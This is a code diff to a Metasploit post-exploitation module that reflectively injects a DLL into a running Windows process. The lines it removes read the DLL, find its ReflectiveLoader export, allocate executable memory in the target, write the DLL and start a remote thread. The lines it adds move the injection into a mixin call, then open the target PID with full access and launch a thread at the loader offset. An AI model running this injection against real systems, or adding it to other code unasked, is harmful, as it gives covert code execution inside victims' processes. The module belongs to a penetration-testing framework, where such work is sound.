@@ -4,9 +4,12 @@
 ##
 
 require 'msf/core'
+require 'msf/core/rdi_mixin'
 require 'rex'
 
 class Metasploit3 < Msf::Post
+
+  include Msf::RdiMixin
 
   def initialize(info={})
     super( update_info( info,
@@ -36,63 +39,18 @@ class Metasploit3 < Msf::Post
     # syinfo is only on meterpreter sessions
     print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
 
-    dll = ''
-    offset = nil
-    begin
-      File.open( datastore['PATH'], "rb" ) { |f| dll += f.read(f.stat.size) }
+    pid = datastore['PID'].to_i
+    host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
 
-      pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )
+    print_status("Injecting #{datastore['PATH']} into #{pid} ...")
+    dll_mem, offset = inject_dll_into_process(host_process, datastore['PATH'])
 
-      pe.exports.entries.each do |entry|
-        if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
-          offset = pe.rva_to_file_offset( entry.rva )
-          break
-        end
-      end
-
-      raise "Can't find an exported ReflectiveLoader function!" if offset.nil? or offset == 0
-    rescue
-      print_error( "Failed to read and parse Dll file: #{$!}" )
-      return
-    end
-
-    inject_into_pid(dll, datastore['PID'], offset)
-  end
-
-  def inject_into_pid(pay, pid, offset)
-
-    if offset.nil? or offset == 0
-      print_error("Reflective Loader offset is nil.")
-      return
-    end
-
-    if pay.nil? or pay.empty?
-      print_error("Invalid DLL.")
-      return
-    end
-
-    if pid.nil? or not has_pid?(pid)
-      print_error("Invalid PID.")
-      return
-    end
-
-    print_status("Injecting #{datastore['DLL_PATH']} into process ID #{pid}")
-    begin
-      print_status("Opening process #{pid}")
-      host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
-      print_status("Allocating memory in procees #{pid}")
-      mem = host_process.memory.allocate(pay.length + (pay.length % 1024))
-      # Ensure memory is set for execution
-      host_process.memory.protect(mem)
-      vprint_status("Allocated memory at address #{"0x%.8x" % mem}, for #{pay.length} bytes")
-      print_status("Writing the payload into memory")
-      host_process.memory.write(mem, pay)
-      print_status("Executing payload")
-      host_process.thread.create(mem+offset, 0)
-      print_good("Successfully injected payload in to process: #{pid}")
-    rescue ::Exception => e
-      print_error("Failed to Inject Payload to #{pid}!")
-      vprint_error(e.to_s)
+    if dll_mem && offset
+      print_status("DLL injected. Executing ReflectiveLoader ...")
+      host_process.thread.create(dll_mem + offset, 0)
+      print_good("DLL injected and invoked.")
+    else
+      print_error("DLL doesn't appear to be reflectively injectable.")
     end
   end
 end
